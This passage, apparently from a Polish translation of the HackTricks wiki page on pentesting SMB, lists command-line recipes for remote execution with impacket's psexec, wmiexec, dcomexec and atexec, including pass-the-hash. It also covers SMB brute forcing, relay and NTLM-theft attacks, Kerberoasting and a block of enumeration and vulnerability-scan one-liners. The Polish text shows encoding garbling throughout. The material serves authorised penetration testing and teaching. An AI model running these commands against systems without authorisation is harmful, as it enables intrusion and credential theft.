Obie opcje **tworzÄ… nowÄ… usÅ‚ugÄ™** (korzystajÄ…c z _\pipe\svcctl_ przez SMB) na maszynie ofiary i uÅ¼ywajÄ… jej do **wykonania czegoÅ›** (**psexec** **wysyÅ‚a** plik wykonywalny do udziaÅ‚u ADMIN$ i **smbexec** wskazuje na **cmd.exe/powershell.exe** i umieszcza w argumentach Å‚adunek --technika bez pliku--).\
**WiÄ™cej informacji** na temat [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md) i [**smbexec**](../windows-hardening/ntlm/smbexec.md).\
W **kali** znajduje siÄ™ w /usr/share/doc/python3-impacket/examples/.
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
Za pomocÄ… **parametru** `-k` moÅ¼na uwierzytelniÄ‡ siÄ™ za pomocÄ… **kerberosa** zamiast **NTLM**.

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

Wykonaj polecenie powÅ‚oki bez dotykania dysku ani uruchamiania nowej usÅ‚ugi za pomocÄ… DCOM przez **port 135**.\
W **kali** znajduje siÄ™ w lokalizacji /usr/share/doc/python3-impacket/examples/
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
Za pomocÄ… **parametru** `-k` moÅ¼esz uwierzytelniÄ‡ siÄ™ za pomocÄ… **kerberosa** zamiast **NTLM**.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

Wykonaj polecenia za pomocÄ… Harmonogramu zadaÅ„ (uÅ¼ywajÄ…c _\pipe\atsvc_ przez SMB).\
W **kali** znajduje siÄ™ w lokalizacji /usr/share/doc/python3-impacket/examples/
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## OdwoÅ‚anie do Impacket

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **PrÃ³ba zÅ‚amania danych uwierzytelniajÄ…cych uÅ¼ytkownikÃ³w**

**Nie jest to zalecane, moÅ¼esz zablokowaÄ‡ konto, jeÅ›li przekroczysz maksymalnÄ… dozwolonÄ… liczbÄ™ prÃ³b**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## Atak SMB Relay

Ten atak wykorzystuje narzÄ™dzie Responder do **przechwytywania sesji uwierzytelniania SMB** w sieci wewnÄ™trznej i **przekazywania** ich do **maszyny docelowej**. JeÅ›li sesja uwierzytelniania **zakoÅ„czy siÄ™ sukcesem**, automatycznie zostaniesz przeniesiony do **powÅ‚oki systemowej**.\
[**WiÄ™cej informacji na temat tego ataku tutaj.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Biblioteka systemu Windows URLMon.dll automatycznie prÃ³buje uwierzytelniÄ‡ siÄ™ wobec hosta, gdy strona prÃ³buje uzyskaÄ‡ dostÄ™p do pewnej zawartoÅ›ci za pomocÄ… SMB, na przykÅ‚ad: `img src="\\10.10.10.10\path\image.jpg"`

Dzieje siÄ™ tak za pomocÄ… funkcji:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

KtÃ³re sÄ… uÅ¼ywane przez niektÃ³re przeglÄ…darki i narzÄ™dzia (takie jak Skype)

![Å¹rÃ³dÅ‚o: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### SMBTrap przy uÅ¼yciu MitMf

![Å¹rÃ³dÅ‚o: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## KradzieÅ¼ NTLM

Podobnie jak w przypadku SMB Trapping, umieszczenie zÅ‚oÅ›liwych plikÃ³w na systemie docelowym (za pomocÄ… SMB, na przykÅ‚ad) moÅ¼e spowodowaÄ‡ prÃ³bÄ™ uwierzytelnienia SMB, co umoÅ¼liwia przechwycenie skrÃ³tu NetNTLMv2 za pomocÄ… narzÄ™dzia takiego jak Responder. SkrÃ³t moÅ¼na nastÄ™pnie zÅ‚amaÄ‡ offline lub uÅ¼yÄ‡ w [atakach SMB Relay](pentesting-smb.md#smb-relay-attack).

[Zobacz: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## Automatyczne polecenia HackTricks
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
